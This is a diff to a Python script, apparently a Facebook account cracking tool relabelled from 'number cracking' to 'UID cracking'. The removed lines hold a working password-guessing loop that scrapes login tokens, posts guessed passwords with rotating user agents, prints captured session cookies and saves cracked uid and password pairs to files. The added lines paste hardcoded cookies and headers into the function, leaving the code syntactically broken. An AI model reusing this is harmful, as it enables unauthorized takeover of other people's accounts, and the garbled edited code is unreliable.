@@ -62,19 +62,19 @@ today = date.today()
 os.system('xdg-open https://www.facebook.com/its.muhib.7?ref=share_group_link')
 os.system('xdg-open https://www.facebook.com/its.muhib.7?ref=share_group_link')
 logo =("""\033[0;92m
-  [1;92m███    ███[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██████ 
-  [1;92m████  ████[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██   ██
-  [1;92m██ ████ ██[1;92m ██      ██[1;92m ███████[1;92m ██[1;92m ██████   
-  [1;92m██  ██  ██[1;92m ██      ██[1;92m ██   ██[1;92m ██[1;92m ██   ██
-  [1;92m██      ██[1;92m ██████████[1;92m ██   ██[1;92m ██[1;92m ██████
+  [1;92m███    ███[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██████ 
+  [1;92m████  ████[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██   ██
+  [1;92m██ ████ ██[1;93m ██      ██[1;97m ███████[1;91m ██[1;92m ██████   
+  [1;92m██  ██  ██[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██   ██
+  [1;92m██      ██[1;93m ██████████[1;97m ██   ██[1;91m ██[1;92m ██████
 [1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗[1;92m
-[1;92m║  [1;92m[1;41m    FREE  NUMBER CLONING V1    [1;94m[1;92m║[1;92m
+[1;92m║   [1;92m[1;41m    FREE  UID CLONING     [1;94m[1;92m║[1;92m
 [1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝[1;92m
 [1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗[1;92m
 [1;92m║➣ [1;92mDEVOLPER   :          MUHIB-143 [1;92m          ║
 [1;92m║➣ [1;92mFACEBOOK   :          MUHIB-143 [1;92m          ║
 [1;92m║➣ [1;92mGITHUB     :          MUHIB-143[1;92m           ║
-[1;92m║➣ [1;92mTOOLS      :           NUMBER CRACKING[1;92m    ║
+[1;92m║➣ [1;92mTOOLS      :           UID CRACKING[1;92m              ║
 [1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
     """) 
 loop = 0
@@ -178,49 +178,28 @@ def rcrack(uid,pwx,tl):
     global oks
     global proxy
     try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\r\r\033[1;32m[MUHIB-143 -OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[1;92m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                cek_apk(session,coki)
-                open('/sdcard/MUHIB-143 -OK.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
+        import requests
+
+cookies = {
+    'datr': 'AgjBYzVAebrqZfk2J5m0xmJQ',
+    'sb': 'AgjBY6DTV-LZXZkl3XBtLFEA',
+}
+
+headers = {
+    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=AgjBYzVAebrqZfk2J5m0xmJQ; sb=AgjBY6DTV-LZXZkl3XBtLFEA',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5386.126 Safari/537.36',}
                 #print('\r\r\33[1;30m[MKR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/MUHIB-143 -CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
